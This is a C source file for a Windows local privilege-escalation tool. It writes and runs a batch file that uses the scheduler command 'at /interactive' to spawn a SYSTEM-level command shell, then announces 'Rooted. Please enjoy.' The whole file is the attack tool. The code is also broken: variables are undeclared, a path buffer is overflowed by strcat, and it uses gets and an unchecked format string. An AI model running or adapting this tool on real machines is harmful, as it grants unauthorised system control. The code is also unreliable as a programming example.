int main(void) {

    char Path[FILENAME_MAX];
    char batchname[] = "abc123.bat";
    char finalPath[] = "G:\\";
    time (&rawtime);
    rawtime += 60;
    formtime = localtime (&rawtime);
    FILE *out;
    int i;
    char time[10];
    char timeh[2];
    int timem1;
    char timem[1]; 
    char cmd0[] = "@echo off";
    char cmd1[] = "at";
    char cmd2[] = "/interactive cmd /a /k \"taskkill /f /im explorer* && explorer.exe\"";
    char cmd[75];
    printf("Choose a mode: \n\t1. Automatic \n\t2. Manual\n       :");
    scanf("%d", &i);
   switch(i)
    {
  case 1:
    strftime(time, 10, "%H:%M", formtime);
    if (!_getcwd(Path, sizeof(Path)))
     {
        fprintf(stderr,"Could not get current directory. Try manual mode.\n");    
     return errno;
     }
    strcat(finalPath, batchname); 
    break;
  case 2:
    printf("Enter 24-hour time (format hh:mm): ");
    scanf("%s", &time);
    if (strlen(time)!=5)
    {
     fprintf(stderr,"Invalid time, enter as hh:mm (01:23). Exiting.");
        return 1;
    }
    printf("\nEnter file path to write to as C:\\foo\\bar: ");
    gets(Path);
    strcpy(finalPath, Path);
    strcat(finalPath, batchname);
    break;
  default:
    printf("invalid choice. exiting.");
        return 1;
    }
    if((out = fopen(finalPath, "w")) == NULL)
    {
        fprintf(stderr,"\nCould not open file for writing! Exiting.");
        return 1;
    }
    strcpy(cmd, cmd0);
    strcat(cmd, "\n");
    strcat(cmd, cmd1);
    strcat(cmd, " ");
    strcat(cmd, time);
    strcat(cmd, " ");
    strcat(cmd, cmd2);
    
    fprintf(out, cmd);   
    fclose(out);
       printf("\n\nSpawning command shell with system privileges...\n");
       system(finalPath);
  
    printf("\nSuccess. Cleaning up...\n\n");
    if(remove(finalPath))
    {
       fprintf(stderr,"Could not remove file! Please run in your own user environment.");
    }  
   
    printf("Rooted. Please enjoy.\n");
    system("pause");

    
    return (0);
}